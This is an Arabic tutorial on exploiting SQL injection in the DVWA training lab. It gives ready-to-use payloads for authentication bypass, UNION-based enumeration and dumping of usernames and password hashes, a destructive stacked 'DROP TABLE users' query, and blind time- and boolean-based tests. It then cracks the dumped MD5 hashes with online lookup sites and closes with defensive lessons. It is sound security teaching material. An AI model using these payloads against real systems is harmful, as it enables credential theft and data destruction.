---
# دليل تقني مفصل: استغلال ثغرات SQL Injection في DVWA

يهدف هذا الدليل إلى توضيح كيفية استخدام حمولات SQL Injection داخل بيئة DVWA بشكل تفصيلي، حيث أشرح طريقة كتابة كل حمولة، ما الهدف منها، ما الذي يحدث في الخلفية داخل قاعدة البيانات، وما النتيجة التقنية المتوقعة.

> هذا المشروع تدريبي فقط، وكل المعلومات الواردة هنا هي لأغراض تعليمية داخل بيئة اختبار مغلقة وآمنة.
---

## 🧪 1. حمولة تجاوز التحقق باستخدام شرط دائم الصواب

### 🔹 الهدف:

تجاوز شرط التحقق الذي يعتمد على تطابق مُعرّف المستخدم `user_id`، للوصول إلى بيانات مستخدمين آخرين أو إلى كل قاعدة البيانات دون الحاجة لإدخال معرف صحيح.

### 🔹 الصيغة المستخدمة:

```sql
1' OR '1'='1' #
```

### 🔹 كيف تعمل:

نقوم بإغلاق القيمة الأولى `'1` ثم نُضيف شرطًا منطقيًا دائم الصواب `OR '1'='1'`، بعدها نستخدم `--` لتعطيل ما تبقى من الاستعلام الأصلي.

### 🔹 مثال توضيحي:

نفترض أن التطبيق يستقبل معرف المستخدم كالتالي:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

إذا أرسلنا:

```
?id=1' OR '1'='1' #
```

الاستعلام يصبح:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1' #';
```

الجزء `'1'='1'` هو دائمًا صحيح، مما يعني أن قاعدة البيانات ستُرجع كل الصفوف.

### 🔹 النتيجة:

بدلًا من عرض بيانات مستخدم واحد، سيعرض التطبيق بيانات كل المستخدمين في الجدول `users`.

### 🔹 الدرس المُستفاد:

- التحقق من إدخال المستخدم مهم جدًا.
- أي إدخال مباشر يُستخدم في استعلام SQL دون فلترة يُشكّل ثغرة.
- يجب استخدام معاملات مُعدّة مسبقًا (Prepared Statements) لحماية الاستعلامات.

---

## 🧪 2. حمولة اكتشاف أسماء الجداول عبر UNION و information_schema

### 🔹 الهدف:

معرفة هيكل قاعدة البيانات، تحديد أسماء الجداول الداخلية لاستخدامها في حمولات لاحقة (مثل استخراج البيانات أو تنفيذ أوامر خبيثة).

### 🔹 الصيغة المستخدمة:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables #
```

### 🔹 كيف تعمل:

- نُغلق بداية الاستعلام بـ `'`.
- نستخدم `UNION` لدمج نتيجة الاستعلام مع استعلام جديد.
- نستعلم عن أسماء الجداول من جدول النظام `information_schema.tables`.

### 🔹 مثال توضيحي:

الاستعلام الناتج:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT table_name, NULL FROM information_schema.tables #';
```

### 🔹 ملاحظات مهمة:

- عدد الأعمدة في استعلام `UNION` يجب أن يطابق عدد الأعمدة في الاستعلام الأصلي. لذا نستخدم `NULL` في العمود الثاني لتطابق البنية.

### 🔹 النتيجة:

تُعرض أسماء الجداول في قاعدة البيانات، ما يُعطي المهاجم خريطة كاملة للبنية الخلفية.

### 🔹 الدرس المُستفاد:

- قاعدة البيانات تحفظ أسماء الجداول في `information_schema`.
- يمكن استخدام `UNION` لاختراق استعلامات غير محمية واستخراج معلومات هيكلية.

---

---

## 🧪 3. حمولة استخراج أسماء الأعمدة من جدول محدد

### 🔹 الهدف:

بعد معرفة اسم الجدول (مثلاً `users`) ننتقل للمرحلة التالية وهي اكتشاف أسماء الأعمدة داخله. هذه الخطوة ضرورية حتى نعرف أسماء الأعمدة التي تحتوي على بيانات حساسة مثل كلمات المرور أو أسماء المستخدمين.

### 🔹 الصيغة المستخدمة:

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #
```

### 🔹 كيف تعمل:

- نغلق الاستعلام الأصلي.
- نستخدم `UNION` لدمج استعلام جديد.
- نستعلم من جدول النظام `information_schema.columns`.
- نحدد فقط الأعمدة التي تنتمي لجدول `users` باستخدام `WHERE table_name='users'`.

### 🔹 مثال توضيحي:

الاستعلام الناتج:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #';
```

### 🔹 ملاحظات:

- يجب التأكد أن اسم الجدول مكتوب بنفس التنسيق الموجود في قاعدة البيانات (بعض قواعد البيانات حساسة لحالة الأحرف).
- نستخدم `NULL` كمكان لعمود إضافي حتى يتطابق عدد الأعمدة.

### 🔹 النتيجة:

يتم عرض أسماء الأعمدة داخل جدول `users` مثل:

```
id
username
password
email
```

### 🔹 الدرس المُستفاد:

- `information_schema.columns` مفيد جدًا في فهم البنية الداخلية لأي جدول.
- معرفة أسماء الأعمدة ضروري جدًا قبل محاولة استخراج بيانات حقيقية منها.

---

## 🧪 4. حمولة استخراج بيانات المستخدمين (usernames & passwords)

### 🔹 الهدف:

بعد اكتشاف أسماء الأعمدة (مثلاً `user` و`password`)، نستغل ذلك لسحب البيانات الحساسة مباشرة من الجدول.

### 🔹 الصيغة المستخدمة:

```sql
' UNION SELECT user, password FROM users #
```

### 🔹 كيف تعمل:

- نُغلق استعلام التطبيق.
- ندمج استعلامًا جديدًا مع `UNION`.
- نختار الأعمدة التي تحتوي على البيانات الحساسة مباشرة من جدول `users`.

### 🔹 مثال توضيحي:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT user, password FROM users #';
```

### 🔹 ملاحظات:

- يجب أن يكون عدد الأعمدة مطابقًا للاستعلام الأصلي.
- إذا اختلف عدد الأعمدة أو أنواع البيانات، قد يتم كشف الخطأ في بعض الحالات.

### 🔹 النتيجة:

يتم عرض أسماء المستخدمين وكلمات مرورهم (وإن كانت مشفرة) مباشرة على الواجهة.

مثال للنتائج:

```
admin | 5f4dcc3b5aa765d61d8327deb882cf99
user1 | e99a18c428cb38d5f260853678922e03
```

### 🔹 الدرس المُستفاد:

- هذه الخطوة هي الأخطر لأن فيها اختراق مباشر للبيانات.
- الحماية عبر التشفير (مثل MD5 أو SHA-1) ضرورية ولكن غير كافية وحدها، لأن كلمة السر المسروقة يمكن فكها عبر قواميس أو أدوات brute-force.

---

## 🧪 5. حمولة تنفيذ أوامر مكدّسة (Stacked Queries)

### 🔹 الهدف:

تنفيذ أكثر من استعلام دفعة واحدة، وغالبًا ما تُستخدم هذه الطريقة لتنفيذ أوامر ضارة مثل حذف جداول أو تغيير بيانات.

### 🔹 الصيغة المستخدمة:

```sql
1'; DROP TABLE users; #
```

### 🔹 كيف تعمل:

- نُغلق الاستعلام الأصلي.
- نضع استعلامًا جديدًا يبدأ بـ `;` مثل `DROP TABLE users;` وهو استعلام مستقل.
- نُكمل بتعليق باقي السطر بـ `--`.

### 🔹 مثال توضيحي:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'; DROP TABLE users; #';
```

### 🔹 ملاحظات:

- هذا النوع من الهجمات لا ينجح دائمًا لأن بعض قواعد البيانات لا تسمح بتنفيذ استعلامات متعددة دفعة واحدة.
- على سبيل المثال، PHP غالبًا لا تدعم stacked queries في MySQL إلا بإعدادات معينة.

### 🔹 النتيجة:

في حال نجح التنفيذ، يتم حذف جدول `users` بالكامل من قاعدة البيانات.

### 🔹 الدرس المُستفاد:

- استخدام أوامر `DROP` أو `DELETE` يُظهر مدى خطورة السماح بتنفيذ استعلامات دون تعقيمها.
- يجب دومًا إغلاق كل مدخلات المستخدم عبر معاملات مُحضّرة مسبقًا (Prepared Statements).

---

## 🧪 6. حمولة SQL Injection أعمى بالاعتماد على الوقت (Time-Based Blind)

### 🔹 الهدف:

في بعض الأنظمة لا تظهر أية رسائل خطأ أو بيانات بعد تنفيذ الاستعلام، لذا نعتمد على الملاحظة الزمنية لاكتشاف وجود الثغرة.

### 🔹 الصيغة المستخدمة:

```sql
1' AND SLEEP(5) #
```

### 🔹 كيف تعمل:

- نغلق الاستعلام.
- نضيف شرطًا منطقيًا صحيحًا (مثل `AND 1=1`) مع أمر `SLEEP(5)` لتأخير التنفيذ 5 ثوانٍ.
- إذا تأخرت الاستجابة 5 ثوانٍ فعلًا، فهذا يعني أن الاستعلام نُفّذ وأن النظام معرض للحقن.

### 🔹 مثال توضيحي:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND SLEEP(5) #';
```

### 🔹 النتيجة:

إذا لاحظنا تأخيرًا ملحوظًا (5 ثوانٍ)، فهذا يُثبت أن الشيفرة التي تم حقنها تم تنفيذها.

### 🔹 الدرس المُستفاد:

- هذا الأسلوب مهم جدًا لاكتشاف الثغرات في الأنظمة التي تُخفي رسائل الخطأ.
- تُستخدم كثيرًا في أدوات الاختبار التلقائي مثل `sqlmap`.

---

## 🧪 7. حمولة SQL Injection أعمى عبر الشروط المنطقية (Boolean-Based)

### 🔹 الهدف:

نُجري تجربتين متقاربتين بشرطين مختلفين: أحدهما يُنتج نتيجة صحيحة والآخر خاطئة. من خلال اختلاف الاستجابة، نعرف إن كانت الثغرة موجودة.

### 🔹 الصيغ المستخدمة:

```sql
1' AND 1=1 #
1' AND 1=2 #
```

### 🔹 كيف تعمل:

- في الأولى: الشرط `1=1` صحيح، فيُنفذ الاستعلام طبيعيًا.
- في الثانية: الشرط `1=2` خاطئ، فيجب أن لا تظهر أية نتائج.
- إذا لاحظنا اختلافًا في الاستجابة بين الطلبين، فإن ذلك يُثبت وجود ثغرة SQLi.

### 🔹 الاستعلامات الناتجة:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=1 #';
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=2 #';
```

### 🔹 النتيجة:

- استعلام 1 يُرجع بيانات.
- استعلام 2 لا يُرجع شيئًا.
- هذا كافٍ لتأكيد وجود ثغرة حتى لو لم نرَ رسائل خطأ.

### 🔹 الدرس المُستفاد:

- هذا النوع من الهجمات فعال جدًا في التطبيقات التي لا تعرض رسائل خطأ.
- يمكن تطويره لاحقًا لاستخراج البيانات عبر حقن أسئلة منطقية (Boolean Extraction).


---


---

## 🧪 8. تحليل كلمات المرور المشفّرة باستخدام أدوات فك التشفير

### 🔹 السياق:

بعد تنفيذ حمولة استخراج بيانات المستخدمين بنجاح (راجع الحمولة رقم 4)، قد لا يتم عرض كلمات المرور كنصوص واضحة، بل تظهر مشفّرة باستخدام خوارزميات مثل:

* **MD5**
* **SHA-1**
* **SHA-256**

مثال لنتائج بعد الاستعلام:

```
admin | 5f4dcc3b5aa765d61d8327deb882cf99
user1 | e99a18c428cb38d5f260853678922e03
```

### 🔹 ما هذا التشفير؟

القيم السابقة ليست كلمات المرور نفسها، بل **قيم مجزّأة (Hashed)** باستخدام خوارزمية MD5. مثلًا:

```
5f4dcc3b5aa765d61d8327deb882cf99 = password
```

### 🔹 كيف نعرف الكلمة الأصلية؟

من خلال استخدام أدوات متخصصة في كسر (أو محاولة كسر) التجزئة عبر قواميس ضخمة مسبقة التوليد (Rainbow Tables) أو قواعد بيانات تحتوي على ملايين القيم المجزأة مع مفكوكاتها.

### 🔹 أدوات مجانية مفيدة:

#### 🔸 [CrackStation](https://crackstation.net/)

موقع يحتوي على قاعدة بيانات ضخمة من كلمات مرور مجزأة ومعروفة مسبقًا. يُمكنك ببساطة نسخ القيمة المجزّأة ولصقها داخل الموقع وسيُحاول مطابقتها.

> ✅ يدعم: MD5, SHA1, SHA256, SHA512
> ⚠️ لا يدعم التجزئة مع "Salt" أو القيم الخاصة بكل مستخدم

#### 🔸 [MD5Online](https://www.md5online.org/md5-decrypt.html)

موقع متخصص فقط في كسر تجزئة MD5. سهل وسريع.

> ✅ مفيد في حالة تطبيقات قديمة تستخدم MD5 بدون Salt
> 🔒 الحساب المدفوع يعطي قاعدة بيانات أوسع

---

### 🔹 مثال عملي:

* استخرجنا القيمة:

```
e99a18c428cb38d5f260853678922e03
```

* نلصقها في CrackStation
* النتيجة: `abc123`

---

### 🔹 الدرس المُستفاد:

* حتى لو لم نحصل على كلمات المرور بنصها الواضح، فإنها تظل معرضة للكشف إذا لم تُشفّر بطريقة آمنة.
* **التشفير بالـ MD5 أو SHA1 غير كافٍ إطلاقًا وحده**، لأنه قابل للعكس عبر القواميس.
* الحل الحقيقي هو استخدام:

  * خوارزميات حديثة مثل **bcrypt** أو **argon2**
  * مع إضافة `Salt` فريد لكل كلمة مرور
  * وتقنيات تأخير مثل `key stretching` أو `iteration count`
 
    **اعداد: بشار نعناع**


---

